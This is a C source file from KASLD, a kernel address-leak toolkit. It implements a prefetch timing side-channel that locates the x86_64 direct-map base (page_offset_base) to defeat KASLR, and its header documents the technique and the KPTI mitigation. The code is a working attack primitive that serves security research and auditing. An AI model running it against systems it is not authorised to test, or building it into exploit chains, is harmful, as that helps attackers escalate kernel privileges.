// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Prefetch side-channel: direct-map (page_offset_base) KASLR bypass.
//
// The same prefetch timing primitive that locates the kernel text base
// (prefetch.c) locates the base of any large contiguous mapped region. The
// direct map — the linear mapping of all physical RAM — is the ideal second
// target: on x86_64 CONFIG_RANDOMIZE_MEMORY randomizes its base
// (page_offset_base) independently of kernel text, and the region is a
// multi-GiB densely-mapped block, so its LEFT EDGE (the lowest mapped page,
// i.e. page_offset_base) is a strong, unambiguous signal.
//
// Recovering page_offset_base resolves the virtual<->physical translation:
// physical leaks then map to virtual addresses and vice versa.
//
// Technique: scan the direct-map KASLR window at 1 GiB (PUD) granularity,
// timing prefetch at each candidate, and detect the left edge of the mapped
// run (see prefetch_scan.h). Requires KPTI disabled, exactly as the text scan.
//
// This is one of the original results of the Gruss et al. prefetch paper
// (USENIX Security 2016), which located the direct-physical map this way.
//
// Scope: L4 (4-level) paging. The L5 (5-level) randomization window spans tens
// of petabytes — far too large for a flat 1 GiB scan — so this declines under
// 5-level paging rather than scan incompletely.
//
// Leak primitive:
//   Data leaked:      direct-map base (page_offset_base) virtual address
//   Kernel subsystem: arch/x86 mm — CONFIG_RANDOMIZE_MEMORY
//   Data structure:   the linear (direct) map (page table walk timing)
//   Address type:     virtual (direct map)
//   Method:           timing (prefetch latency, 1 GiB scan)
//   Status:           unfixed (hardware side-channel)
//   Access check:     N/A (hardware side-channel — no kernel gate)
//   Source:           N/A (hardware side-channel)
//
// Mitigations:
//   KPTI (CONFIG_PAGE_TABLE_ISOLATION=y) removes kernel mappings from the
//   userspace page tables, eliminating the timing differential. Auto-disabled
//   on CPUs not vulnerable to Meltdown (all AMD, Intel Ice Lake+).
//
// References:
//   https://gruss.cc/files/prefetch.pdf
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/prefetch_scan.h"
#include "include/sidechannel.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Prefetch side-channel against the direct map: the same PREFETCH timing "
    "differential that reveals mapped-vs-unmapped kernel text also reveals the "
    "base of the direct map (page_offset_base), which CONFIG_RANDOMIZE_MEMORY "
    "randomizes independently on x86_64. Scanning PREFETCH latency across the "
    "1 GiB-aligned candidate bases locates the mapped region's left edge. "
    "Mitigated by KPTI. L4 paging only.");

KASLD_META("method:timing\n"
           "phase:probing\n"
           "addr:virtual\n"
           "hardware:KPTI\n"
           "config:RANDOMIZE_MEMORY\n");

static int verbose = 0;

// The direct map is randomized on the 1 GiB (PUD) grid. The 1 GiB-huge-page
// mapping produces a WEAKER prefetch differential than 2 MiB kernel text, so it
// needs many more iterations to accumulate the sub-quantum signal above the
// noise (the whole point of the AMD sum strategy). The marginal base slot is
// only caught in a fraction of passes, so run many passes: each is an
// independent chance to catch it, and the vote (directmap_vote) takes the
// lowest edge caught by >= 2 of them.
#define DM_STEP RANDOMIZE_MEMORY_ALIGN
#define DM_ITERATIONS 64
#define DM_PASSES 11

// Cluster confirmation for the dense direct-map block: a slot begins the run if
// it and >= DM_CONFIRM_K of the next DM_CONFIRM_M slots are mapped. Kept small
// (the block is contiguous) so systems with only a few GiB of RAM still
// confirm, while isolated scheduler outliers do not.
#define DM_CONFIRM_K 3
#define DM_CONFIRM_M 4

// ---------------------------------------------------------------------------
// The direct-map KASLR window: candidate page_offset_base positions of DM_STEP
// bytes, from the compile-time base up to where vmalloc would begin (the direct
// map is the lowest of the randomized regions, so it never reaches vmalloc).
// Returns the slot count and sets *win_base, or 0 on 5-level paging (out of
// scope: the L5 window is too large for a flat scan).
// ---------------------------------------------------------------------------
static size_t directmap_window(uint64_t *win_base) {
  if (detect_la57())
    return 0;
  *win_base = PAGE_OFFSET_BASE_L4;
  return (size_t)((VMALLOC_BASE_L4 - PAGE_OFFSET_BASE_L4) / DM_STEP);
}

// ---------------------------------------------------------------------------
// Robust vote of the detected left edge across passes. The base is the region's
// left-edge FLOOR: nothing is mapped below page_offset_base, so a pass never
// detects an edge below it — passes that miss the (marginal) base slot land
// HIGHER instead. The best estimate is therefore the LOWEST detected edge, not
// the median. Requiring the winner to be corroborated by >= 2 passes rejects a
// lone pass that under-shot on noise; the fallback is the minimum. Sets
// *n_found to the number of passes that located an edge (distinguishes
// no-signal from a too-weak one). Returns the page_offset_base address, or 0.
// ---------------------------------------------------------------------------
static unsigned long directmap_vote(int vendor, size_t n, uint64_t win_base,
                                    int *n_found) {
  unsigned long results[DM_PASSES];
  uint64_t *times = (uint64_t *)malloc(n * sizeof(uint64_t));
  if (!times) {
    kasld_err("out of memory for %zu-slot scan buffer", n);
    return 0;
  }

  int i;
  for (i = 0; i < DM_PASSES; i++) {
    prefetch_scan_collect(times, n, win_base, DM_STEP, vendor, DM_ITERATIONS);
    if (verbose && i == 0)
      prefetch_scan_dump(times, n, win_base, DM_STEP,
                         vendor == CPU_VENDOR_AMD ? "sum_cycles"
                                                  : "min_cycles");
    long edge =
        prefetch_scan_find_edge(times, n, vendor, DM_CONFIRM_K, DM_CONFIRM_M);
    results[i] = edge < 0 ? 0 : win_base + (unsigned long)edge * DM_STEP;
    if (verbose)
      fprintf(stderr, "# pass %d: 0x%lx\n", i, results[i]);
  }
  free(times);

  /* Gather the located (non-zero) edges. */
  unsigned long edges[DM_PASSES];
  int found = 0;
  for (i = 0; i < DM_PASSES; i++)
    if (results[i])
      edges[found++] = results[i];
  if (n_found)
    *n_found = found;

  /* Enough passes must locate SOME edge to trust there is a signal — a fixed
   * floor, not a proportion of DM_PASSES. The direct-map differential is weak,
   * so only a fraction of passes locate an edge; a majority requirement would
   * make MORE passes counterproductive (raising the bar the weak signal must
   * clear). Three independent detections is the confidence floor. */
  if (found < 3)
    return 0;

  /* Sort ascending (insertion sort; found is tiny), then return the lowest edge
   * located by >= 2 passes — the corroborated left-edge floor. Falls back to
   * the minimum if no value repeats. */
  for (i = 1; i < found; i++) {
    unsigned long key = edges[i];
    int j = i - 1;
    while (j >= 0 && edges[j] > key) {
      edges[j + 1] = edges[j];
      j--;
    }
    edges[j + 1] = key;
  }
  for (i = 0; i + 1 < found; i++)
    if (edges[i] == edges[i + 1])
      return edges[i];
  return edges[0];
}

static unsigned long get_directmap_base_prefetch(void) {
  int cpu = detect_cpu_vendor();
  bool pti = detect_kpti();

  if (cpu == CPU_VENDOR_UNKNOWN)
    kasld_info("unknown CPU vendor, assuming Intel-like behavior");
  else
    kasld_info("%s CPU detected", cpu == CPU_VENDOR_AMD ? "AMD" : "Intel");

  if (!has_rdtscp()) {
    kasld_err("rdtscp instruction not supported on this CPU");
    return 0;
  }

  if (pti) {
    fprintf(stderr,
            "[-] KPTI is enabled; prefetch side-channel is ineffective\n"
            "    (kernel pages unmapped from userspace page tables)\n");
    return 0;
  }

  kasld_info("KPTI is not detected");

  uint64_t win_base = 0;
  size_t n = directmap_window(&win_base);
  if (n == 0) {
    kasld_err("5-level paging (la57) is active; the direct-map KASLR window is "
              "too large for a flat scan (unsupported)");
    return 0;
  }

  pin_cpu(0);

  int n_found = 0;
  unsigned long base = directmap_vote(cpu, n, win_base, &n_found);

  if (!base) {
    if (n_found == 0)
      kasld_err("no direct-map signal: the scan found no mapped-region cluster "
                "(this CPU may not leak through prefetch page-walk latency, or "
                "the direct map is smaller than the confirmation window)");
    else
      kasld_err("weak prefetch signal: only %d/%d passes located an edge "
                "(scheduler / frequency / thermal noise); a quieter run may "
                "resolve it",
                n_found, DM_PASSES);
    return 0;
  }

  return base;
}

int main(int argc, char *argv[]) {
  kasld_cli(argc, argv);
  verbose = kasld_is_verbose();

  kasld_info("trying prefetch direct-map side-channel ...");

  unsigned long base = get_directmap_base_prefetch();
  if (!base) /* get_directmap_base_prefetch already reported the reason */
    return 0;

  kasld_info("possible direct-map base (page_offset_base): %lx", base);
  /* The left edge of the mapped direct map IS page_offset_base — the lowest
   * mapped linear-map address. Report it as a base claim; the engine
   * (directmap_page_offset_bounds) bounds Q_PAGE_OFFSET from it, pinning it
   * with SF_PHYS_MAX_PFN. Region DIRECTMAP. CONF_TIMING: a cache-timing
   * measurement that can miss, so it shapes the speculative window only — a
   * parsed leak overrides it, an agreeing one corroborates it. */
  kasld_result_base(KASLD_TYPE_VIRT, REGION_DIRECTMAP, base, NULL, CONF_TIMING);

  return 0;
}
